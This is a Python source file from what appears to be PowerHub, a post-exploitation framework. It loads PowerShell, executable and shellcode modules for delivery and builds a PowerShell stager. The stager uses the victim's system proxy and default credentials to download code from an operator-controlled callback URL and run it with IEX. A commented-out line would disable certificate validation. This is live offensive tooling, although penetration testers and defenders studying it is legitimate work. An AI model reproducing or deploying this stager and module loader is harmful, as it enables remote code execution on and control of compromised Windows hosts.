from powerhub.args import args
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MOD_DIR = os.path.join(
    BASE_DIR,
    'modules',
)

#  modules = []


def import_module_type(mod_type, filter=lambda x: True):
    """Load modules of one type from file to memory

    'filter' is applied to the basename of each file. The file will only be
    added if it is returns True. 'mod_type' must be one of 'ps1', 'exe' or
    'shellcode'.
    """

    assert mod_type in ['ps1', 'exe', 'shellcode']

    directory = os.path.join(MOD_DIR, mod_type)
    result = []
    for dirName, subdirList, fileList in os.walk(directory, followlinks=True):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            if filter(fname):
                with open(filename, "br") as f:
                    d = f.read()
                result.append(Module(
                    filename.replace(os.path.join(BASE_DIR, 'modules'), ''),
                    mod_type,
                    d,
                ))
    return result


def ensure_dir_exists(dirname):
    """Creates a directory if it doesn't exist already

    """
    if not os.path.exists(dirname):
        os.makedirs(dirname)


def import_modules():
    """Import all modules and returns them as a list

    """
    ensure_dir_exists(MOD_DIR)
    ensure_dir_exists(os.path.join(MOD_DIR, 'ps1'))
    ensure_dir_exists(os.path.join(MOD_DIR, 'exe'))
    ensure_dir_exists(os.path.join(MOD_DIR, 'shellcode'))

    ps_modules = import_module_type(
        'ps1',
        filter=lambda fname: "tests" not in fname and fname.endswith('.ps1')
    )
    exe_modules = import_module_type(
        'exe',
        filter=lambda fname: fname.endswith('.exe'),
    )
    shellcode_modules = import_module_type('shellcode')

    result = ps_modules + exe_modules + shellcode_modules
    for i, m in enumerate(result):
        m.n = i

    return result


class Module(object):
    """Represents a module

    """

    def __init__(self, name, type, code):
        self.name = name
        self.short_name = os.path.basename(name)
        self.type = type
        self._code = code
        self.code = ""
        self.active = False
        self.n = -1

    def activate(self):
        self.active = True
        self.code = self._code

    def deactivate(self):
        self.active = False
        self.code = ""


modules = import_modules()

callback_url = '%s://%s:%d/%s' % (
    args.PROTOCOL,
    args.URI_HOST,
    args.URI_PORT,
    f'{args.URI_PATH}/' if args.URI_PATH else '',
)


stager_str = (
    #  "[System.Net.ServicePointManager]::ServerCertificateValidationCallback #  = {$true};" if args.SSL else "" # noqa
    "$K=new-object net.webclient;"
    "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
    "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
    "IEX $K.downloadstring('%s0');"
) % callback_url
